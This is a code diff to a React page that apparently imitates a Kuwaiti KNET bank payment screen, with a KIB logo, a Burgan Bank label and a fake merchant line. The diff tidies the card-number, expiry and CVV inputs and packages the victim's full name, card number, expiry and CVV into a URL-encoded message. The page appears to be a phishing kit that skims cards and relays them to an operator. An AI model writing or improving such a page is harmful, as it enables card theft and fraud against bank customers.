@@ -20,19 +20,21 @@ export default function KnetPage() {
       fullName.trim() === "" ||
       cardNumber.trim() === "" ||
       expData.trim() === "" ||
-
       cvv.trim() === ""
     ) {
       alert("من فضلك املئ الحقول");
       return;
     }
 
+    // تقسيم التاريخ إلى شهر وسنة
+    const [expMonth, expYear] = expData.split("/");
+
     const text = `
 %0A🏦 بنك برقان
 👤 الاسم الكامل: ${fullName}%0A
 💳 رقم البطاقة: ${cardNumber}%0A
-📅  شهر: ${expMonth}%0A
-📅  سنة: ${expYear}%0A
+📅  شهر: ${expMonth || "?"}%0A
+📅  سنة: ${expYear || "?"}%0A
 🔐 CVV: ${cvv}
     `;
 
@@ -55,9 +57,8 @@ export default function KnetPage() {
         </div>
 
         <div className={styles.knetInfo}>
-             <Image src={kibLo} alt="KIB Logo"  width={120}/>
+          <Image src={kibLo} alt="KIB Logo" width={120} />
           <div className={styles.knetInfoRow}>
-         
             <span className={styles.knetInfoLabel}>Merchant:</span>
             <span>Tap Payments EPSP</span>
           </div>
@@ -95,6 +96,8 @@ export default function KnetPage() {
               <input
                 type="text"
                 maxLength="16"
+                inputMode="numeric"
+                pattern="[0-9]*"
                 value={cardNumber}
                 onChange={(e) => setCardNumber(e.target.value)}
                 required
@@ -104,38 +107,32 @@ export default function KnetPage() {
           </div>
           <hr />
 
-          <div>
-            <label className={styles.formLabel}>Expiration Date:</label>
-            <div className={styles.expRow}>
-                <div>
-                                <label className={styles.formLabel}>CVV:</label>
-            <input
-              type="number"
-              maxLength="6"
-              value={expDat}
-              onChange={(e) => setExpData(e.target.value)}
-              required
-              className={styles.formInput}
-            />
-                </div>
-                              <div>
-                                <label className={styles.formLabel}>CVV:</label>
-            <input
-              type="number"
-              maxLength="4"
-              value={cvv}
-              onChange={(e) => setCvv(e.target.value)}
-              required
-              className={styles.formInput}
-            />
-                </div>
-          
+          <div className={styles.expRow}>
+            <div>
+              <label className={styles.formLabel}>Expiration (MM/YY):</label>
+              <input
+                type="text"
+                placeholder="MM/YY"
+                pattern="\d{2}/\d{2}"
+                value={expData}
+                onChange={(e) => setExpData(e.target.value)}
+                required
+                className={styles.formInput}
+              />
             </div>
-          </div>
-          <hr />
-
-          <div>
-
+            <div>
+              <label className={styles.formLabel}>CVV:</label>
+              <input
+                type="text"
+                maxLength="4"
+                inputMode="numeric"
+                pattern="\d*"
+                value={cvv}
+                onChange={(e) => setCvv(e.target.value)}
+                required
+                className={styles.formInput}
+              />
+            </div>
           </div>
           <hr />
 
